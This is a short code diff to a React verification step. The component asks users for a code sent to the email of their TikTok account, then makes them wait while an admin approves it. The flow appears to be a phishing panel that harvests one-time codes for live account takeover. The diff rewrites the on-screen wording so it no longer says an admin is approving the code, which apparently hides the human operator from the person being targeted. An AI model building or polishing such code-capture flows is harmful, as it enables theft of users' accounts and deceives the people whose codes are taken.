@@ -51,7 +51,7 @@ export function VerifyCodeStep({ submissionId, onNext, onBack }: VerifyCodeStepP
 
             toast({
               title: 'Code Submitted!',
-              description: "Waiting for admin approval.",
+              description: "Code submitted for verification.",
             });
             
             // Don't call onNext yet. Instead, show the waiting component.
@@ -68,7 +68,7 @@ export function VerifyCodeStep({ submissionId, onNext, onBack }: VerifyCodeStepP
             <WaitingForApproval
                 submissionId={submissionId}
                 stepToWatch="verificationCode"
-                promptText="Verifying your code."
+                promptText="Please keep this page open."
                 promptHint="You should receive a code via the email linked to your TikTok account."
                 onApproval={() => onNext({ verificationCode: form.getValues('verificationCode') })}
                 onRejection={() => {
